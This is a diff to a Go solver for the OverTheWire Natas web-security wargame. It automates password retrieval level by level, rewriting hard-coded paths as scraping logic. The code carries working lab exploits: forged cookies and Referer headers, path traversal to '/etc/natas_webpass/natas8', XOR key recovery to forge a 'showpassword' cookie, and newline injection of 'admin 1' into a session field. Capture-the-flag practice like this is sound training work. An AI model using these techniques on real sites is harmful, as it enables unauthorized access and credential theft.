@@ -17,15 +17,130 @@ var levels = [...]Grabber{
 	//level 1
 	Prefixed{grab, "The password for natas2 is ", 32},
 	//level 2
-	Path{Prefixed{grab, "natas3:", 32}, Text{"/files/users.txt"}}, // image @ /files/pixel.png, go to folder, find users.txt
+	Path{
+		Prefixed{
+			grab,
+			"natas3:",
+			32,
+		},
+		Combine{
+			Combine{
+				Text{"/"},
+				Cut{
+					XPath{grab, "//img/@src"},
+					"/",
+					0,
+				},
+			},
+			Combine{
+				Text{"/"},
+				Cut{
+					Cut{
+						Path{
+							grab,
+							Combine{
+								Text{"/"},
+								Combine{
+									Cut{
+										XPath{grab, "//img/@src"},
+										"/",
+										0,
+									},
+									Text{"/"},
+								},
+							},
+						},
+						"\"[TXT]\"",
+						1,
+					},
+					"\"",
+					1,
+				},
+			},
+		},
+	},
 	//level 3
-	Path{Prefixed{grab, "natas4:", 32}, Text{"/s3cr3t/users.txt"}}, // robots.txt references /s3cr3t/, find users.txt
+	Prefixed{
+		Path{
+			grab,
+			Combine{
+				Trim{
+					Cut{
+						Path{
+							grab,
+							Text{"/robots.txt"},
+						},
+						"Disallow: ",
+						1,
+					},
+				},
+				Cut{
+					Cut{
+						Path{
+							grab,
+							Trim{
+								Cut{
+									Path{
+										grab,
+										Text{"/robots.txt"},
+									},
+									"Disallow: ",
+									1,
+								},
+							},
+						},
+						"\"[TXT]\"",
+						1,
+					},
+					"\"",
+					1,
+				},
+			},
+		},
+		"natas4:",
+		32,
+	},
 	//level 4
 	Headers{Prefixed{grab, "The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
 	//level 5
 	Headers{Prefixed{grab, "The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
 	//level 6
-	Post{Prefixed{grab, "The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{grab, "$secret = \"", 19}, Text{"/includes/secret.inc"}}}, nil},
+	Post{
+		Prefixed{
+			grab,
+			"The password for natas7 is ",
+			32,
+		},
+		SetData{
+			"submit": Text{"Submit Query"},
+			"secret": Path{
+				Cut{
+					grab,
+					"\"",
+					1,
+				},
+				Combine{
+					Text{"/"},
+					Cut{
+						Cut{
+							Path{
+								grab,
+								Combine{
+									Text{"/"},
+									XPath{grab, "//a/@href"},
+								},
+							},
+							"include&nbsp;",
+							1,
+						},
+						"\"",
+						1,
+					},
+				},
+			},
+		},
+		nil,
+	},
 	//level 7
 	Get{Prefixed{grab, "<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
 	//level 8
@@ -38,7 +153,10 @@ var levels = [...]Grabber{
 					Hex2Dec{
 						Path{
 							Prefixed{grab, "$encodedSecret&nbsp;=&nbsp;\"", 32},
-							Text{"/index-source.html"},
+							Combine{
+								Text{"/"},
+								XPath{grab, "//a/@href"},
+							},
 						},
 					},
 				},
@@ -56,15 +174,17 @@ var levels = [...]Grabber{
 		SetData{
 			"Cookie": Combine{
 				Text{"data="},
-				Base64Encode{
-					XOR{
-						Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"},
-						FindRepeating{
-							XOR{
-								Base64Decode{
-									Cookie{"data"},
+				URLEncode{
+					Base64Encode{
+						XOR{
+							Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"},
+							FindRepeating{
+								XOR{
+									Base64Decode{
+										Cookie{"data"},
+									},
+									Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"},
 								},
-								Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"},
 							},
 						},
 					},
@@ -237,7 +357,16 @@ var levels = [...]Grabber{
 						grab,
 						"natas21",
 					},
-					SetData{"Cookie": Text{"PHPSESSID=1"}},
+					SetData{
+						"Cookie": Combine{
+							Text{"PHPSESSID="},
+							Random{
+								"Level20Cookie",
+								RandomNumLowerLetters,
+								32,
+							},
+						},
+					},
 				},
 				SetData{
 					"name": Text{"a\nadmin 1"},
@@ -250,7 +379,16 @@ var levels = [...]Grabber{
 				32,
 			},
 		},
-		SetData{"Cookie": Text{"PHPSESSID=1"}},
+		SetData{
+			"Cookie": Combine{
+				Text{"PHPSESSID="},
+				Random{
+					"Level20Cookie",
+					RandomNumLowerLetters,
+					32,
+				},
+			},
+		},
 	},
 	//level 21
 	Headers{
@@ -315,7 +453,26 @@ var levels = [...]Grabber{
 			"Password: ",
 			32,
 		},
-		SetData{"passwd": Text{"11iloveyou"}},
+		SetData{
+			"passwd": Combine{
+				Text{"11"},
+				Cut{
+					Cut{
+						Path{
+							grab,
+							Combine{
+								Text{"/"},
+								XPath{grab, "//a/@href"},
+							},
+						},
+						"],</span><span style=\"color: #DD0000\">",
+						1,
+					},
+					"\"",
+					1,
+				},
+			},
+		},
 	},
 	//level 24
 	Get{
